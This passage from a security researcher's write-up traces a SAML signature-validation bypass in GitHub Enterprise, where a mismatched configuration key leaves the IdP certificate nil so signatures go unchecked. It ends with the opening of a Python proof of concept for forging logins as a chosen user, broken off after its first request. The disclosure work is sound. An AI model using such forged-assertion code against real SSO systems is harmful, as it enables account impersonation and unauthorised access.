  &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;request_tracking?&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;in_response_to_request?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;log_auth_validation_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;failure - Unauthorized - In Response To invalid&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="no"&gt;GitHub&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Authentication&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;failure&lt;/span&gt; &lt;span class="ss"&gt;:message&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;UNAUTHORIZED_RESPONSE&lt;/span&gt;
  &lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The interesting part starts when &lt;cite&gt;valid?&lt;/cite&gt; is called:&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;valid?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="ss"&gt;:issuer&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="ss"&gt;:idp_certificate&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;idp_certificate&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="ss"&gt;:sp_url&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;log_auth_validation_event&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;log_data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;failure - Invalid SAML response&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="no"&gt;GitHub&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Authentication&lt;/span&gt;&lt;span class="o"&gt;::&lt;/span&gt;&lt;span class="no"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;failure&lt;/span&gt; &lt;span class="ss"&gt;:message&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;INVALID_RESPONSE&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The &lt;cite&gt;valid?&lt;/cite&gt; method of &lt;cite&gt;saml_response&lt;/cite&gt; actually calls &lt;cite&gt;validate&lt;/cite&gt; from of the &lt;cite&gt;Message&lt;/cite&gt; class (&lt;cite&gt;/lib/saml/message.rb&lt;/cite&gt;)&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="c1"&gt;# Public: Validates schema and custom validations.&lt;/span&gt;
&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;span class="c1"&gt;# Returns false if instance is invalid. #errors will be non-empty if&lt;/span&gt;
&lt;span class="c1"&gt;# invalid.&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;valid?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{})&lt;/span&gt;
  &lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;clear&lt;/span&gt;
  &lt;span class="n"&gt;validate_schema&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;validate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;empty?&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and in turn &lt;cite&gt;validate&lt;/cite&gt; method called above is implemented in &lt;cite&gt;Response&lt;/cite&gt; class, that implements &lt;cite&gt;Message&lt;/cite&gt; in &lt;cite&gt;/data/github/current/lib/saml/message/response.rb&lt;/cite&gt;&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;validate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="no"&gt;SAML&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mocked&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:skip_validate_signature&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
      &lt;span class="n"&gt;validate_has_signature&lt;/span&gt;
      &lt;span class="n"&gt;validate_signatures&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt;
    &lt;span class="n"&gt;validate_issuer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_destination&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_recipient&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_conditions&lt;/span&gt;
    &lt;span class="n"&gt;validate_audience&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;validate_name_id_format&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:name_id_format&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;So I ended here and I had no clear way of knowing whether &lt;cite&gt;validate_has_signature&lt;/cite&gt; and &lt;cite&gt;validate_signatures&lt;/cite&gt; where executed or not. &lt;cite&gt;SAML.mocked&lt;/cite&gt; would need to have been set to true somewhere and this would affect everything which seemed rather improbable, and I was certain that the &lt;cite&gt;idp_certificate&lt;/cite&gt; was set since one cannot complete the SAML configuration part in the admin UI without setting this.&lt;/p&gt;
&lt;p&gt;The only way to know was to debug the functionality, the way debugging was meant to be done: Print statements. Jokes aside, having limited exposure to Ruby and unicorn adding &lt;cite&gt;puts&lt;/cite&gt; or &lt;cite&gt;pp&lt;/cite&gt; statements was the easiest way for me to get some insights at that point.&lt;/p&gt;
&lt;p&gt;So I replaced the obfuscated code with the de-obfuscated version of &lt;cite&gt;/data/github/current/lib/saml/message/response.rb&lt;/cite&gt; and changed the following&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;validate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;pp&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="no"&gt;SAML&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mocked&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:skip_validate_signature&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
      &lt;span class="nb"&gt;puts&lt;/span&gt; &lt;span class="s1"&gt;'Going to validate the signature'&lt;/span&gt;
      &lt;span class="n"&gt;validate_has_signature&lt;/span&gt;
      &lt;span class="n"&gt;validate_signatures&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;end&lt;/span&gt;
&lt;span class="o"&gt;...&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Next I had to figure out what runs the ruby application, so that I would know which logs to check for for the output.&lt;/p&gt;
&lt;p&gt;I started of by seeing what listens on port 443 and figured out that it is haproxy that then passes on the request to nginx which then passes it to unicorn.
Using &lt;cite&gt;systemctl list-units&lt;/cite&gt; I then found that the name of the service is github-unicorn and from the &lt;cite&gt;data/github/current/config/unicorn.rb&lt;/cite&gt; file the location of the log file at &lt;cite&gt;/var/log/githib/unicorn.log&lt;/cite&gt;&lt;/p&gt;
&lt;p&gt;Armed with the knowledge above, I restarted the service, performed an authentication and took a look at the log to see what's going on and saw the following:&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://idp.ikakavas.gr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://192.168.122.244&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Since &lt;cite&gt;:idp_certificate&lt;/cite&gt; was nil, &lt;code class="rubyinline ruby"&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="no"&gt;SAML&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;mocked&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:skip_validate_signature&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="n"&gt;options&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;/code&gt; validated to false, and &lt;cite&gt;validate_has_signature&lt;/cite&gt; and &lt;cite&gt;validate_signatures&lt;/cite&gt; that would actually check the validity of the signatures were never executed!!&lt;/p&gt;
&lt;p&gt;Digging deeper to the source of the issue and the actual bug, I traced back to &lt;cite&gt;/data/github/current/lib/github/authentication/saml.rb&lt;/cite&gt; where the &lt;cite&gt;valid&lt;/cite&gt; is called&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="k"&gt;unless&lt;/span&gt; &lt;span class="n"&gt;saml_response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;valid?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
  &lt;span class="ss"&gt;:issuer&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="ss"&gt;:idp_certificate&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;idp_certificate&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="ss"&gt;:sp_url&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;and the method &lt;cite&gt;idp_certificate&lt;/cite&gt;. It looks like this:&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="c1"&gt;# Public: Returns a string containing the IdP certificate or nil.&lt;/span&gt;
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;idp_certificate&lt;/span&gt;
   &lt;span class="vi"&gt;&amp;#64;idp_certificate&lt;/span&gt; &lt;span class="o"&gt;||=&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
     &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
   &lt;span class="k"&gt;elsif&lt;/span&gt; &lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate_path&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
     &lt;span class="no"&gt;File&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;configuration&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:idp_certificate_path&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
   &lt;span class="k"&gt;end&lt;/span&gt;
 &lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;I kept staring at it, and nothing seemed off. I couldn't spot any error so &amp;quot;puts to the rescue!&amp;quot;
A few minutes later (unicorn restart took quite some time with 4GB of RAM) I was looking at what the configuration Hash looked like&lt;/p&gt;
&lt;pre class="code ruby literal-block"&gt;
&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:sso_url&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://idp.ikakavas.gr/sso&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:idp_initiated_sso&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:disable_admin_demote&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:issuer&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://idp.ikakavas.gr&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:signature_method&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:digest_method&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;http://www.w3.org/2000/09/xmldsig#sha1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:idp_certificate_file&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/data/user/common/idp.crt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:sp_pkcs12_file&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/data/user/common/saml-sp.p12&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:admin&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:profile_name&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:profile_mail&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:profile_key&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:profile_gpg_key&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="kp"&gt;nil&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
 &lt;span class="ss"&gt;:sp_url&lt;/span&gt;&lt;span class="o"&gt;=&amp;gt;&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;https://192.168.122.244&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;The bug was staring me in the face. And it was a simple one.&lt;/p&gt;
&lt;p&gt;The configuration Hash has a property called &lt;cite&gt;idp_certificate_file&lt;/cite&gt; and the code in  &lt;cite&gt;/data/github/current/lib/github/authentication/saml.rb&lt;/cite&gt; attempted to get the &lt;cite&gt;idp_certificate_path&lt;/cite&gt;. This returned &lt;cite&gt;nil&lt;/cite&gt; and effectively disabled all SAML message integrity/authenticity protection.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="poc"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id14"&gt;PoC&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;I wrote up the above and created the following PoC so that they could validate the issue easily:&lt;/p&gt;
&lt;pre class="code python literal-block"&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;urllib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;zlib&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;base64&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;re&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;datetime&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;pprint&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;urlparse&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;parse_qs&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;requests.packages.urllib3.exceptions&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;InsecureRequestWarning&lt;/span&gt;
&lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;packages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urllib3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;disable_warnings&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;# Change this to reflect your GHE setup&lt;/span&gt;
&lt;span class="n"&gt;URL&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;'https://192.168.122.244/login?return_to=https%3A&lt;/span&gt;&lt;span class="si"&gt;%2F%2F&lt;/span&gt;&lt;span class="s1"&gt;192.168.122.244&lt;/span&gt;&lt;span class="si"&gt;%2F&lt;/span&gt;&lt;span class="s1"&gt;'&lt;/span&gt;
&lt;span class="n"&gt;ISSUER&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'https://idp.ikakavas.gr'&lt;/span&gt;
&lt;span class="n"&gt;RECIPIENT&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'https://192.168.122.244/saml/consume'&lt;/span&gt;
&lt;span class="n"&gt;AUDIENCE&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'https://192.168.122.244'&lt;/span&gt;
&lt;span class="c1"&gt;# user to impersonate&lt;/span&gt;
&lt;span class="n"&gt;NAMEID&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;'testuser'&lt;/span&gt;

&lt;span class="c1"&gt;# Get a client that can handle cookies&lt;/span&gt;
&lt;span class="n"&gt;saml_client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;session&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="c1"&gt;# Make the initial request to trigger the authentication middleware&lt;/span&gt;
&lt;span class="c1"&gt;# Disallow redirects as we need to catch the Location header and parse it&lt;/span&gt;
&lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;saml_client&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;verify&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_redirects&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;False&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;idp_login_url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;headers&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;'Location'&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="c1"&gt;# Get the HTTP GET parameters as a dict&lt;/span&gt;
&lt;span class="n"&gt;saml_message&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;dict&lt;/span&gt;&lt;span class="p"&gt;([(&lt;/span&gt;&lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;k&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;v&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;parse_qs&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;idp_login_url&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;items&lt;/span&gt;&lt;span class="p"&gt;()]))&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="s1"&gt;'SAMLRequest'&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;saml_message&lt;/span&gt; &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="s1"&gt;'RelayState'&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;saml_message&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
